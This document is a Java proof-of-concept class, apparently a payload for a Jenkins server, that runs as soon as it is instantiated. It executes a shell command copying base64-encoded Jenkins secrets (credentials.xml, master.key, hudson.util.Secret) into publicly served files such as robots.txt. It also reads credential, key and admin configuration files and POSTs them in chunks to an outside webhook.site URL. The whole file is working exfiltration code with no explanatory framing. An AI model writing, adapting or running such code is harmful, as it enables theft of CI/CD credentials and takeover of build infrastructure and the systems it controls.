import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;

public class poc {
    static final String WH = "https://webhook.site/b0de7905-1496-47b6-93a5-8529f9c02252";
    static final String CMD =
        "J=${JENKINS_HOME:-/var/lib/jenkins}; W=$J/war; " +
        "O=$(ls -la $J 2>&1); " +
        "for f in credentials.xml config.xml secret.key secrets/master.key secrets/hudson.util.Secret; do " +
        "O=\\"$O\\n== $f ==\\n$(base64 -w0 \\"$J/$f\\" 2>/dev/null | head -c 40000)\\"; done; " +
        "for P in \\"$W/robots.txt\\" \\"$W/jnlpJars/zz.txt\\"; do mkdir -p \\"$(dirname \\"$P\\")\\" 2>/dev/null; " +
        "printf '%b' \\"$O\\" > \\"$P\\" 2>/dev/null; done";

    public poc() {
        try { shell(); } catch (Throwable t) { }
        try { exfil(); } catch (Throwable t) { try { post("P7ERR " + t); } catch (Throwable t2) { } }
    }

    static void shell() throws Exception {
        Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", CMD});
    }

    static void post(String data) throws Exception {
        HttpURLConnection c = (HttpURLConnection) new URL(WH).openConnection();
        c.setConnectTimeout(15000);
        c.setReadTimeout(25000);
        c.setRequestMethod("POST");
        c.setDoOutput(true);
        c.setRequestProperty("Content-Type", "text/plain; charset=UTF-8");
        OutputStream os = c.getOutputStream();
        os.write(data.getBytes("UTF-8"));
        os.flush();
        os.close();
        try { c.getResponseCode(); } catch (Throwable t) { }
    }

    static void exfil() throws Exception {
        String jh = System.getenv("JENKINS_HOME");
        if (jh == null || jh.isEmpty()) jh = System.getProperty("user.home") + "/.jenkins";
        StringBuilder sb = new StringBuilder();
        sb.append("P7 jh=").append(jh)
          .append(" user=").append(System.getProperty("user.name"))
          .append(" java=").append(System.getProperty("java.version"))
          .append(" proxy=").append(System.getProperty("http.proxyHost")).append(":").append(System.getProperty("http.proxyPort"))
          .append(" os=").append(System.getProperty("os.name")).append("\n");
        for (String cand : new String[]{jh, "/var/lib/jenkins", "/var/jenkins_home", "/usr/share/jenkins"}) {
            try {
                Path d = Paths.get(cand);
                if (!Files.isDirectory(d)) continue;
                sb.append("== LS ").append(cand).append(" ==\n");
                DirectoryStream<Path> ds = Files.newDirectoryStream(d);
                for (Path p : ds) sb.append(p.getFileName()).append("  ");
                sb.append("\n");
            } catch (Throwable t) { }
        }
        String[] files = {"credentials.xml","config.xml","secret.key","secrets/master.key",
                          "secrets/hudson.util.Secret","secrets/initialAdminPassword",
                          "identity.key.enc","users/admin/config.xml","jobs"};
        for (String f : files) {
            try {
                Path p = Paths.get(jh, f);
                if (Files.isRegularFile(p) && Files.isReadable(p)) {
                    byte[] b = Files.readAllBytes(p);
                    sb.append("== FILE ").append(f).append(" (").append(b.length).append("B) ==\n")
                      .append(Base64.getEncoder().encodeToString(b)).append("\n");
                } else {
                    sb.append("== MISSING ").append(f).append(" ==\n");
                }
            } catch (Throwable t) { sb.append("== ERR ").append(f).append(" ").append(t).append("\n"); }
        }
        String all = sb.toString();
        int chunk = 150000;
        for (int i = 0, n = 0; i < all.length() && n < 40; i += chunk, n++) {
            post("P7|" + i + "|" + all.substring(i, Math.min(all.length(), i + chunk)));
            try { Thread.sleep(200); } catch (Throwable t) { }
        }
    }
}
